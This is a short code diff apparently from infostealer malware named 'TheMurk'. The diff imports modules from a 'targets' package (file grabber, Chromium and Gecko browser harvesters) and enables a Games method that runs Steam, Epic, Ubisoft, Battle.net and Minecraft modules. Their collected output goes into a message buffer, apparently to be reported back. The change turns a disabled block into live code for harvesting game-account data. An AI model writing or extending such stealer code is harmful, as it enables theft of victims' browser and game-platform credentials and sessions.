@@ -5,6 +5,11 @@ from targets.files.files import TxtFiles
 from targets.files.file_grabber import Grab
 from targets.browsers.chromium import Chromium
 from targets.browsers.geckodriver import GeckoDriver
+from targets.games.steam import Steam
+from targets.games.epicgames import Epic
+from targets.games.uplay import Ubisoft
+from targets.games.battlenet import BattleNet
+from targets.games.minecraft import Minecraft
 
 class TheMurk:
     def __init__(self) -> None:
@@ -43,11 +48,9 @@ class TheMurk:
         config.msgBrowsers = GeckoDriver(config.msgBrowsers)
 
 
-''' def Games():
-        config.msgOther.append("\n\n**🕹Games🕹**")
-        config.msgOther = epicGames.Epic(config.msgOther)
-        config.msgOther = Uplay.Ubisoft(config.msgOther)
-        config.msgOther = Minecraft.Minecraft(config.msgOther)
-        config.msgOther = roblox.roblox(config.msgOther)
-        config.msgOther = steam.Steam(config.msgOther)
-        config.msgOther =BattleNET.BattleNet(config.msgOther)'''
+    def Games(self):
+        config.msgOther = Steam(config.msgOther)
+        config.msgOther = Epic(config.msgOther)
+        config.msgOther = Ubisoft(config.msgOther)
+        config.msgOther = Minecraft(config.msgOther)
+        config.msgOther = BattleNet(config.msgOther)
